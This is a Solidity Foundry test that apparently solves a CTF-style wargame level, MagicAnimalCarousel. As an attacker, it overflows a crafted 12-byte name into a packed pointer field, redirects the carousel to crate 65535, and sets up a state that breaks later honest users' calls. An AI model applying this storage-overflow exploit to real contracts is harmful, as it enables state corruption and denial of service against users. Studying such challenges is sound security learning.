// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";

import "./Magicanimalcarousel.sol";

contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarousel level;
    address attacker = makeAddr("attacker");

    function setUp() public {
        level = new MagicAnimalCarousel();
    }

    function test_exploit_magic_animal_carousel() public {
        vm.startPrank(attacker);

        // STEP 1: Add an animal so crate 1 is initialized.
        // This sets currentCrateId = 1 and crate 1's nextCrateId = 2.
        level.setAnimalAndSpin("Dog");
        assertEq(level.currentCrateId(), 1);

        uint256 crate1 = level.carousel(1);
        uint16 nextFrom1 = uint16(crate1 >> 160);
        assertEq(nextFrom1, 2, "crate 1 should initially point to crate 2");

        // STEP 2: Overflow the name into the nextCrateId bytes via a 12‑byte string.
        // The last two bytes (0xFFFF) will overwrite crate 1's nextCrateId to 65535.
        string memory exploitName = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        level.changeAnimal(exploitName, 1);

        crate1 = level.carousel(1);
        nextFrom1 = uint16(crate1 >> 160);
        assertEq(nextFrom1, type(uint16).max, "crate 1 should now point to crate 65535");

        // STEP 3: Add another animal; because crate 1 now points to 65535,
        // this call writes into crate 65535 and sets currentCrateId = 65535.
        level.setAnimalAndSpin("Parrot");
        assertEq(level.currentCrateId(), type(uint16).max, "current crate should now be 65535");

        // For completeness, confirm crate 65535's nextCrateId loops back to 1,
        // preparing the state so that a future honest user call will hit a non‑empty crate 1.
        uint256 crate65535 = level.carousel(type(uint16).max);
        uint16 nextFrom65535 = uint16(crate65535 >> 160);
        assertEq(nextFrom65535, 1, "crate 65535 should point back to crate 1");

        vm.stopPrank();
    }
}

